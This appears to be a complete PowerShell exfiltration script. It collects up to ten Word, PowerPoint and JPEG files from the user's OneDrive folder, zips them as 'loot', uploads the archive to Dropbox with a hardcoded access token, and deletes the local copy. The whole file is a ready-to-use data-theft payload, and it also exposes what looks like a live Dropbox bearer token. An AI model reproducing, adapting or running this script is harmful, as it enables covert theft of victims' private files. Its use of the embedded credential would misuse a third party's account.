function Upload-DropBox() {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]$SourceFilePath
    ) 
    $dropBoxAccessToken = "sl.BneEW0k3sBfY39xwSpZIbEWRpMnXyOQELiRRcd1P7LuG14M0NQccXDqG6jKHGjF9d2bx1md_2coYAK1Nw3ziht8t9RnuRPLGuhnS73-8teLb-EjokV4Re5PW1v8RpJ6wWUYlKWdJMfWi_4w"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $dropBoxAccessToken
    $authHeaders = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $authHeaders.Add("Authorization", $authorization)
    $authHeaders.Add("Dropbox-API-Arg", $arg)
    $authHeaders.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
}

if (Test-Path $env:OneDrive) {
    $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot.zip" -Update -ErrorAction SilentlyContinue
}

if (Test-Path "$env:TEMP\imabdk-loot.zip") {
    Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot.zip"
    Remove-Item -Path "$env:TEMP\imabdk-loot.zip" -Force
}
